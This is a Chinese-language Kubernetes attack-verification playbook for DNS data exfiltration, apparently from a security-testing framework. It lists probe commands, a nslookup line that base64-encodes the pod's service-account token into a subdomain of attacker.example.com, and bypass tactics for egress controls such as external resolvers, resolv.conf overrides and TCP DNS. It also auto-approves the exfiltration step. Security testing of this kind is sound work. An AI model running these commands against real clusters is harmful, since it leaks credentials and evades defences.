---
source: manual
confidence: high
platforms: [k8s]
required_tools: []
execution_contexts: [L0, L1, L2]
max_verification_level: L2
destructive: false
mapped_attack_surfaces: [AS-3.3]
mapped_compliance_families: [CNI网络]
---

# DNS 数据外泄

## 1. 前置条件

- 容器内 DNS 解析允许外部域名查询
- Pod 未配置 egress NetworkPolicy 限制 DNS 出口（UDP/TCP 53）
- 外部 DNS 可达（CoreDNS/kube-dns 允许递归查询）
- 无 DNS 审计日志或监控

## 2. 探测命令

- [L0] `kubectl get networkpolicies -A` → 期望：无阻止 DNS 出口的策略
- [L0] `kubectl get configmap coredns -n kube-system -o yaml` → 期望：检查 CoreDNS 配置，是否允许外部解析
- [L1] `kubectl exec <pod> -n <ns> -- nslookup external-domain.example.com` → 期望：成功解析外部域名
- [L1] `kubectl exec <pod> -n <ns> -- dig +short external-domain.example.com @kube-dns.kube-system.svc.cluster.local` → 期望：通过集群 DNS 解析外部域名
- [L1] `kubectl exec <pod> -n <ns> -- cat /etc/resolv.conf` → 期望：DNS 配置指向集群 DNS 或外部 DNS

## 3. 攻击验证

- [L2] 单字符 DNS 外泄验证（编码方式）：
  `kubectl exec <pod> -n <ns> -- nslookup <encoded-data>.attacker.example.com` → 期望：DNS 查询成功到达外部服务器
- [L2] 子域名单次外泄验证：
  `kubectl exec <pod> -n <ns> -- nslookup $(cat /var/run/secrets/kubernetes.io/serviceaccount/token | base64 -w0 | head -c 100).attacker.example.com` → 期望：SA token 作为子域名被编码外泄
- [L2] 批量 DNS 外泄验证：
  `kubectl exec <pod> -n <ns> -- sh -c 'for i in $(seq 1 3); do nslookup "test${i}.attacker.example.com" 2>&1; done'` → 期望：多批次 DNS 查询成功

## 4. 差分证明

- 攻击前 [L0]: NetworkPolicy 未限制 DNS 出口
- 攻击后 [L2]: 从 Pod 内成功通过 DNS 协议将数据编码发送到外部域名
- 对比：正常 DNS 查询 volume vs 异常 DNS 查询（大量子域名编码查询）
- 在攻击者控制的 DNS 服务器上捕获到包含编码数据的查询记录

## 5. 绕过策略

- 若 CoreDNS 限制递归查询：使用 Pod 内直接指定外部 DNS 服务器（如 `dig @8.8.8.8 attacker.example.com`）
- 若短域名查询被限制：使用长子域名编码（Base64/hex 编码分段传输）
- 若 Kubernetes DNS 被限制：在容器的 `/etc/resolv.conf` 中覆盖 DNS 服务器
- 若 UDP 被阻止：使用 TCP DNS 查询（`dig +tcp`）
- 若 DNS 长度限制（253 字符）：分批传输，每批编码短数据段

## 6. 证伪条件

- [L1] `nslookup` 外部域名完全失败（超时或拒绝）→ 证伪
- [L0] NetworkPolicy 严格限制 egress DNS 仅允许集群内部域名 → 证伪
- [L0] CoreDNS 配置 `block_cidrs` 或 `block_names` 阻止外部解析 → 证伪
- [L1] Pod 的 `/etc/resolv.conf` 仅指向内部 DNS 且内部 DNS 不递归 → 证伪

## 7. 审批级别

Level 2：探测命令（nslookup/dig）自动通过。
Level 2：攻击验证（DNS 外泄验证）自动通过。
destructive: false

## 8. MITRE ATT&CK

T1048 - Exfiltration Over Alternative Protocol（通过 DNS 协议外泄数据）